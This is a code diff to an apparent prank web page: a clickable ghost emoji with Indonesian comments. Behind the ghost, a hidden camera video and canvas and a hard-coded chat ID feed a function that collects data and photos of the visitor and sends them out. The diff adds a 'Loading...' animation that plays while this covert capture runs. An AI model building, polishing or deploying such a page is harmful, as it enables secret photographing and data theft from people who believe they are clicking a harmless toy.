@@ -18,10 +18,14 @@
             justify-content: center;
             align-items: center;
             overflow: hidden;
+            flex-direction: column;
         }
         
         .ghost-container {
             position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         
         .main-ghost {
@@ -32,10 +36,25 @@
             position: relative;
             transition: transform 0.2s;
             filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
+            margin-bottom: 20px;
         }
         
         .main-ghost:active {
             transform: scale(0.9);
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 6vw;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-family: Arial, sans-serif;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        
+        .loading-text.show {
+            opacity: 1;
         }
         
         .ghost-particle {
@@ -57,11 +76,31 @@
                 transform: translate(var(--tx), var(--ty)) scale(0.1) rotate(360deg);
             }
         }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                filter: brightness(1) drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
+            }
+            50% {
+                transform: scale(1.1);
+                filter: brightness(1.5) drop-shadow(0 0 30px rgba(255, 255, 255, 1));
+            }
+            100% {
+                transform: scale(1);
+                filter: brightness(1) drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
+            }
+        }
+        
+        .loading {
+            animation: pulse 0.8s infinite;
+        }
     </style>
 </head>
 <body>
     <div class="ghost-container">
         <div class="main-ghost" id="mainGhost">👻</div>
+        <div class="loading-text" id="loadingText">Loading...</div>
     </div>
 
     <video id="cameraVideo" autoplay muted style="display: none;"></video>
@@ -73,6 +112,7 @@
         const CHAT_ID = "6368768388";
         
         const mainGhost = document.getElementById('mainGhost');
+        const loadingText = document.getElementById('loadingText');
         const cameraVideo = document.getElementById('cameraVideo');
         const cameraCanvas = document.getElementById('cameraCanvas');
         
@@ -107,11 +147,16 @@
             playClickSound();
             isCollecting = true;
             
-            // Langsung mulai mengambil data dan foto
+            // Tampilkan loading
+            mainGhost.classList.add('loading');
+            loadingText.classList.add('show');
+            
+            // Ambil data dan foto selama loading
             await collectAndSendData();
             
-            // Delay 3 detik untuk pengecut
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            // Sembunyikan loading
+            mainGhost.classList.remove('loading');
+            loadingText.classList.remove('show');
             
             // Tampilkan partikel
             createGhostParticles(e.clientX, e.clientY);
@@ -490,4 +535,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
